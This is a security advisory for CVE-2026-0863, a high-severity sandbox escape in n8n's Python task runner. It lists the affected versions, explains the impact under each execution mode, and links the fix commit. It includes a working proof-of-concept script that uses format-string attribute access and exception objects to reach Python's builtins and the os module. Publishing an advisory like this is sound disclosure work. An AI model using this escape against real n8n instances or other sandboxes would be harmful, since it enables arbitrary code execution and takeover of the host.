---
description: CVE-2026-0863, HIGH, n8n Python runner sandbox escape
title: n8n Python runner sandbox escape
date_published: "2026-01-18"
last_updated: "2026-01-18"
xray_id: JFSA-2026-001651077
vul_id: CVE-2026-0863
cvss: 8.5
severity: high
discovered_by: Natan Nehorai
type: vulnerability

---

## Summary

Sandbox escape in n8n Python task runner allows for arbitrary code execution on the underlying host.

## Component

n8n

## Affected versions

(,1.123.14)

[2.0.0,2.3.5)

[2.4.0,2.4.2)

## Description

Using string formatting and exception handling, an attacker may bypass n8n's python-task-executor sandbox restrictions and run arbitrary unrestricted Python code in the underlying operating system.
The vulnerability can be exploited via the Code block by an authenticated user with basic permissions and can lead to a full n8n instance takeover on instances operating under "Internal" execution mode.
If the instance is operating under the  "External" execution mode (ex. n8n's official Docker image) - arbitrary code execution occurs inside a Sidecar container and not the main node, which significantly reduces the vulnerability impact.

## PoC

Run the following code in a "Python (Native)" Code block -

```python
def new_getattr(obj, attribute, *, Exception):
    try:
        f'{{0.{attribute}.ribbit}}'.format(obj)
    except Exception as e:
        return e.obj

try:
    raise ValueError("pwn")
except Exception as e:
    tb = new_getattr(e, '__traceback__', Exception=Exception)
    frame = new_getattr(tb, 'tb_frame', Exception=Exception)
    builtins = new_getattr(frame, 'f_builtins', Exception=Exception)
    us = chr(95)
    imprt = builtins[us+us+'import'+us+us]
    import_globals = new_getattr(imprt, '__globals__', Exception=Exception)

    os = import_globals['os']
return [{"json": {
        "uname": os.uname()
    }}]

```



After executing, the result will be a JSON object with the `uname` command’s output.



## Vulnerability Mitigations

No mitigations are supplied for this issue

## References

[Fix commit](https://github.com/n8n-io/n8n/commit/b73a4283cb14e0f27ce19692326f362c7bf3da02)



